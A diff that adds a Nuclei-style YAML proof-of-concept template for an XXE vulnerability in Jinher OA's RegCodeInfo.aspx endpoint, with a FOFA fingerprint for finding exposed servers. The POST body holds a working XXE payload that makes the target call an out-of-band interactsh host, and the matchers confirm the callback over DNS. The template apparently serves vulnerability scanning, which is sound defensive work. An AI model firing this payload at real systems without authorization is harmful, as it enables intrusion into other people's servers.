@@ -1,0 +1,44 @@
+id: poc-yaml-jinher-regcodeinfo-aspx-xxe
+info:
+  name: 金和OA RegCodeInfo.aspx XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: POST
+    path:
+      - "/c6/Jhsoft.Web.dossier/RegCodeInfo.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [
+      <!ENTITY % remote SYSTEM "http://{{reverse}}/xxe_test">
+      %remote;]>
+      <root/>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+    extractors:
+      - type: regex
+        part: interactsh_protocol
+        regex:
+          - "dns"
